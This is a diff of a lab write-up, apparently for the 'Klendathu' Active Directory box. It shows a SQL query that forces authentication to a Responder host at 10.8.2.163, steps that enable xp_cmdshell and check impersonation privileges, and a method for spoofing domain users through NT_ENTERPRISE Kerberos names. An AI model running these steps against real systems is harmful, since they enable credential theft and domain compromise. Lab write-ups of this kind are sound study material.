@@ -163,7 +163,7 @@ But i found this [https://www.brentozar.com/archive/2017/07/sql-server-2017-less
 
 So i set a responder and i ran this :
 
-```SQL
+```bash
 SELECT * FROM sys.dm_os_enumerate_filesystem('\\10.8.2.163', 'toto')
 ```
 ![alt text](../assets/image_klendathu/2er.png)
@@ -203,11 +203,11 @@ export KRB5CCNAME='Administrator.ccache'
 
 mssqlclient.py srv1.klendathu.vl -windows-auth -k
 ```
-```SQL
--- Enable xp_cmdshell
+```bash
+# Enable xp_cmdshell
 > EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
--- Verify that we have SeImpersonatePrivilege
+# Verify that we have SeImpersonatePrivilege
 > xp_cmdshell "whoami /priv"
 
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled
@@ -245,6 +245,8 @@ And thanks to NT_ENTERPRISE we can spoof domain users
 
 [The algorithm to find which user will be used for authentication purposes when searching for principals within the realm](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6435d3fb-8cf6-4df5-a156-1277690ed59c)
 
+Simplified version of the algorithm :
+
 ![Simplified version of the algorithm](../assets/image_klendathu/5er.png)
 
 So let's verify if we have "Generic Write" on a domain user :
@@ -255,7 +257,7 @@ Yes we have !! We can also modify their password, let's check which user are in 
 
 ![Linux_Admins](../assets/image_klendathu/6er.png)
 
-Ok so, we need to edit the attribute "userPrincipalName" on flores or leivy (no matter) and make the "name-type" be NT_COMPANY instead of NT_PRINCIPAL, we can do this with rubeus or if we modify getTGT.py of the impacket collections
+Ok so, we need to edit the attribute "userPrincipalName" of flores or leivy (no matter) and make the "name-type" be NT_ENTERPRISE instead of NT_PRINCIPAL, we can do this with Rubeus.exe or if we modify getTGT.py of the impacket collections
 
 After that we gonna have a .ccache with which we can ssh as "Linux_Admins"
 
